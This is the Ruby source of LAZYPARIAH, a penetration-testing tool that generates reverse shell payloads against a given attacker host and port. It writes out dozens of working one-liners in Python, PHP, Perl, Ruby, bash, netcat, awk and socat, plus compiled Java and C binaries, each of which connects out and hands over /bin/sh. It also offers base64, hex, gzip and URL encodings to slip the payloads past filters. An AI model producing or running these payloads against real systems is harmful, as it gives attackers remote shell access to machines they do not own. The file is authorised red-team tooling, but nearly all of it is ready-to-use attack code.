#!/usr/bin/env ruby
#
# Title: LAZYPARIAH
# Version: 0.4.0
# Description:
#	LAZYPARIAH is a simple tool for generating various reverse shell payloads
#	on the fly. It is intended to be used only in authorised circumstances by
#	qualified penetration testers, security researchers and red team professionals.
#
# Copyright (C) 2020 Peter Bruce Funnell
#
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU
# General Public License as published by the Free Software Foundation, either version 3 of the License,
# or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even
# the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public
# License for more details.
#
# You should have received a copy of the GNU General Public License along with this program. If not,
# see <https://www.gnu.org/licenses/>.

# Load the necessary gems.
require "base64"
require "optparse"
require "erb"
require "zlib"
require "stringio"

# Define constants.
PROGRAM_NAME = "LAZYPARIAH".freeze()
PROGRAM_VERSION = "0.4.0".freeze()
EXECUTABLE_NAME = "lazypariah".freeze()

# Define payload list.
PAYLOAD_LIST = [
	"python",
	"python3_c",
	"python2_c",
	"python_c",
	"python3_b64",
	"python2_b64",
	"python_b64",
	"python3_hex",
	"python2_hex",
	"python_hex",
	"nc",
	"nc_pipe",
	"php_fd_3",
	"php_fd_4",
	"php_fd_5",
	"php_fd_6",
	"php_fd_3_c",
	"php_fd_4_c",
	"php_fd_5_c",
	"php_fd_6_c",
	"php_fd_3_tags",
	"php_fd_4_tags",
	"php_fd_5_tags",
	"php_fd_6_tags",
	"perl",
	"perl_c",
	"perl_b64",
	"perl_hex",
	"ruby",
	"ruby_c",
	"ruby_b64",
	"ruby_hex",
	"bash_tcp",
	"awk",
	"socat",
	"java_class_binary",
	"java_class_b64",
	"java_class_gzip_b64",
	"c_binary",
	"c_binary_b64",
	"c_binary_hex",
	"c_binary_gzip",
	"c_binary_gzip_b64",
	"c_binary_gzip_hex"
].sort()

# Define function for displaying program information.
def prog_info(donation_info=true)
	puts("#{PROGRAM_NAME} #{PROGRAM_VERSION}")
	puts("Copyright (C) 2020 Peter Bruce Funnell")
	if donation_info
		puts("\nBTC Donation Address (Author): 3EdoXV1w8H7y7M9ZdpjRC7GPnX4aouy18g")
	end
end

# Initialise command line argument parser.
option_parser = OptionParser.new do |options|
	options.banner = "\nUsage:\t#{EXECUTABLE_NAME} [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>\n"
	options.banner << "Note:\t<ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.\n\n"
	options.banner << "Example:\tlazypariah -u python3_b64 10.10.14.4 1555\n"
	options.banner << "Example:\tlazypariah python2_c malicious.local 1337\n\n"
	options.banner << "Valid Payloads:\n"
	PAYLOAD_LIST.each do |p|
		options.banner << "#{" "*4}#{p}\n"
	end
	options.banner << "\nValid Options:\n"
	options.on("-h", "--help", "Display help text and exit.")
	options.on("-l", "--license", "Display license information and exit.")
	options.on("-u", "--url", "URL-encode the payload.")
	options.on("-v", "--version", "Display version information and exit.\n\n")
end

# Define port_check method for strings.
class String
	def port_check()
		(self.to_i.to_s == self) and (self.to_i >= 0 and self.to_i <= 65535)
	end
end

# Define print_output.
def print_output(s, url_encode=false)
	if url_encode
		print(ERB::Util.url_encode(s))
	else
		print(s)
	end
end

# Attempt to parse command line arguments.
begin
	arguments = Hash.new()
	option_parser.parse!(into: arguments)
	if arguments[:version]
		prog_info(donation_info=false)
		exit()
	else
		if arguments.length < 1 and ARGV.length < 1
			prog_info()
			puts("\nNo command line arguments were detected. Please consult the help text below for details on how to use #{PROGRAM_NAME}.\n")
			puts(option_parser)
			exit()
		elsif arguments[:help]
			prog_info()
			puts(option_parser)
			exit()
		elsif arguments[:license]
			prog_info(donation_info=false)
			puts("\nThis program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see <https://www.gnu.org/licenses/>.")
		elsif ARGV.length < 3
			prog_info()
			puts("\nThe command line arguments given to #{PROGRAM_NAME} were insufficient. #{PROGRAM_NAME} requires a payload type, attacker IP address and an attacker port in order to generate a reverse shell payload.\n")
			puts(option_parser)
			exit()
		elsif ARGV.length > 3
			prog_info()
			puts("\nToo many command line arguments were given to #{PROGRAM_NAME}.\n")
			puts(option_parser)
			exit()
		elsif not PAYLOAD_LIST.include?(ARGV[0])
			prog_info()
			puts("\n#{PROGRAM_NAME} did not recognise the specified payload. Please consult the valid list of payloads below.\n")
			puts(option_parser)
			exit()
		elsif not ARGV[2].port_check()
			prog_info()
			puts("\nThe specified port was invalid. Please specify a port between 0 and 65535 (inclusive).\n\n")
		else
			url_encode = arguments[:url] ? true: false
			case ARGV[0]
			when "python"
				print_output("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode=url_encode)
			when "python3_c"
				print_output("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode=url_encode)
			when "python2_c"
				print_output("python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode=url_encode)
			when "python_c"
				print_output("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode=url_encode)
			when "python3_b64"
				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output("echo #{code} | base64 -d | python3", url_encode=url_encode)
			when "python3_hex"
				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output("echo #{code} | xxd -p -r - | python3", url_encode=url_encode)
			when "python2_b64"
				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output("echo #{code} | base64 -d | python2", url_encode=url_encode)
			when "python2_hex"
				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output("echo #{code} | xxd -p -r - | python2", url_encode=url_encode)
			when "python_b64"
				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output("echo #{code} | base64 -d | python", url_encode=url_encode)
			when "python_hex"
				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output("echo #{code} | xxd -p -r - | python", url_encode=url_encode)
			when "nc"
				print_output("nc -e /bin/sh #{ARGV[1]} #{ARGV[2]}", url_encode=url_encode)
			when "nc_pipe"
				print_output("/bin/sh | nc #{ARGV[1]} #{ARGV[2]}", url_encode=url_encode)
			when "php_fd_3"
				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&3 >&3 2>&3\");", url_encode=url_encode)
			when "php_fd_4"
				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&4 >&4 2>&4\");", url_encode=url_encode)
			when "php_fd_5"
				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");", url_encode=url_encode)
			when "php_fd_6"
				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");", url_encode=url_encode)
			when "php_fd_3_c"
				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", url_encode=url_encode)
			when "php_fd_4_c"
				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&4 >&4 2>&4\");'", url_encode=url_encode)
			when "php_fd_5_c"
				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");'", url_encode=url_encode)
			when "php_fd_6_c"
				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");'", url_encode=url_encode)
			when "php_fd_3_tags"
				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&3 >&3 2>&3\");?>", url_encode=url_encode)
			when "php_fd_4_tags"
				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&4 >&4 2>&4\");?>", url_encode=url_encode)
			when "php_fd_5_tags"
				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");?>", url_encode=url_encode)
			when "php_fd_6_tags"
				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");?>", url_encode=url_encode)
			when "perl"
				print_output("use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", url_encode=url_encode)
			when "perl_c"
				print_output("perl -e 'use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", url_encode=url_encode)
			when "perl_b64"
				code = Base64.strict_encode64("use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};")
				print_output("echo #{code} | base64 -d | perl", url_encode=url_encode)
			when "perl_hex"
				code = "use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};".unpack("H*")[0]
				print_output("echo #{code} | xxd -p -r - | perl", url_encode=url_encode)
			when "ruby"
				print_output("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", url_encode=url_encode)
			when "ruby_c"
				print_output("ruby -e 'require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", url_encode=url_encode)
			when "ruby_b64"
				code = Base64.strict_encode64("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end")
				print_output("echo #{code} | base64 -d | ruby", url_encode=url_encode)
			when "ruby_hex"
				code = "require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end".unpack("H*")[0]
				print_output("echo #{code} | xxd -p -r - | ruby", url_encode=url_encode)
			when "bash_tcp"
				print_output("bash -i >& /dev/tcp/#{ARGV[1]}/#{ARGV[2]} 0>&1", url_encode=url_encode)
			when "awk"
				print_output("awk 'BEGIN {s = \"/inet/tcp/0/#{ARGV[1]}/#{ARGV[2]}\"; while(42) {do {printf \"[Awk Reverse Shell] >> \" |& s; s |& getline c; if (c) {while ((c |& getline) > 0) print $0 |& s; close(c);}} while (c != \"exit\") close(s);}}' /dev/null", url_encode=url_encode)
			when "socat"
				print_output("socat tcp-connect:#{ARGV[1]}:#{ARGV[2]} system:/bin/sh", url_encode=url_encode)
			when "java_class_binary", "java_class_b64", "java_class_gzip_b64"
				code = "import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class rs {public rs() throws Exception {Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();Socket s=new Socket(\"#{ARGV[1]}\",#{ARGV[2]});InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0) {so.write(pi.read());}while(pe.available()>0) {so.write(pe.read());}while(si.available()>0) {po.write(si.read());}so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;} catch (Exception e) {}}p.destroy();s.close();}}"

				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
				temp_file = temp_dir+"/rs.java"

				system("echo '#{code}' > #{temp_file}; javac #{temp_file};")

				File.open(temp_dir+"/rs.class", "r") do |f|
					java_payload = f.read()
					case ARGV[0]
					when "java_class_binary"
						print_output(java_payload)
					when "java_class_b64"
						java_payload_b64 = Base64.strict_encode64(java_payload)
						print_output(java_payload_b64, url_encode=url_encode)
					when "java_class_gzip_b64"
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(java_payload)
						gz.close()
						java_payload_gzip = sio.string
						java_payload_gzip_b64 = Base64.strict_encode64(java_payload_gzip)
						print_output(java_payload_gzip_b64, url_encode=url_encode)
					end
				end

				system("rm -r #{temp_dir}")
			when "c_binary", "c_binary_gzip", "c_binary_b64", "c_binary_gzip_b64", "c_binary_hex", "c_binary_gzip_hex"
				code = "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\nint main(void){int port = #{ARGV[2]};struct sockaddr_in revsockaddr;int sockt = socket(AF_INET, SOCK_STREAM, 0);revsockaddr.sin_family = AF_INET;revsockaddr.sin_port = htons(port);revsockaddr.sin_addr.s_addr = inet_addr(\"#{ARGV[1]}\");connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));dup2(sockt, 0);dup2(sockt, 1);dup2(sockt, 2);char * const argv[] = {\"/bin/sh\", NULL};execve(\"/bin/sh\", argv, NULL);\nreturn 0;}"

				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
				temp_file = temp_dir+"/rs.c"

				system("echo '#{code}' > #{temp_file}; gcc #{temp_file} -o #{temp_dir+"/rs"};")

				File.open(temp_dir+"/rs", "r") do |f|
					binary_payload = f.read()
					case ARGV[0]
					when "c_binary"
						print_output(binary_payload)
					when "c_binary_b64"
						binary_payload_b64 = Base64.strict_encode64(binary_payload)
						print_output(binary_payload_b64, url_encode=url_encode)
					when "c_binary_hex"
						binary_payload_hex = binary_payload.unpack("H*")[0]
						print_output(binary_payload_hex)
					when "c_binary_gzip"
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						print_output(binary_payload_gzip)
					when "c_binary_gzip_b64"
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						binary_payload_gzip_b64 = Base64.strict_encode64(binary_payload_gzip)
						print_output(binary_payload_gzip_b64, url_encode=url_encode)
					when "c_binary_gzip_hex"
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						binary_payload_gzip_hex = binary_payload_gzip.unpack("H*")[0]
						print_output(binary_payload_gzip_hex)
					end
				end

				system("rm -r #{temp_dir}")
			end
		end
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	# Invalid command line arguments were detected. Say so, display the help text, and exit.
	puts("\nOne or more command line arguments were invalid.\n")
	puts(option_parser)
	exit()
end
